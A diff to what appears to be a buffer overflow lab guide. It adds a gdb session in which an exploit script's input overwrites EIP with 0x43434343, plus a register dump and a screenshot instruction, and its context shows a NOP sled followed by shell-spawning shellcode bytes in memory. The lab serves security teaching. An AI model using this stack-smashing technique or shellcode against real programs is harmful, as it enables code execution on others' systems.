@@ -575,6 +575,37 @@ When inspecting the memory, we can see our payload was injected as
 expected:
 
 ```bash
+(gdb) run $(python3 exploit-test.py)
+Starting program: /home/khaefner/Development/buffer_overflow/vuln $(python3 exploit-test.py)
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+
+Program received signal SIGSEGV, Segmentation fault.
+0x43434343 in ?? ()
+(gdb) info registers
+eax            0x0                 0
+ecx            0xffffd4e0          -11040
+edx            0xffffd07b          -12165
+ebx            0x43434343          1128481603
+esp            0xffffd080          0xffffd080
+ebp            0x43434343          0x43434343
+esi            0x56558eec          1448447724
+edi            0xf7ffcb80          -134231168
+eip            0x43434343          0x43434343
+eflags         0x10292             [ AF SF IF RF ]
+cs             0x23                35
+ss             0x2b                43
+ds             0x2b                43
+es             0x2b                43
+fs             0x0                 0
+gs             0x63                99
+
+```
+---
+`Action:`  Take a screen shot of your memory layout
+---
+
+```bash
 (gdb) x/16x $sp+430
 0xffffcfee:	0x90909090	0x90909090	0x90909090	0x90909090
 0xffffcffe:	0x50c03190	0x732f6e68	0x2f2f6868	0xe3896962
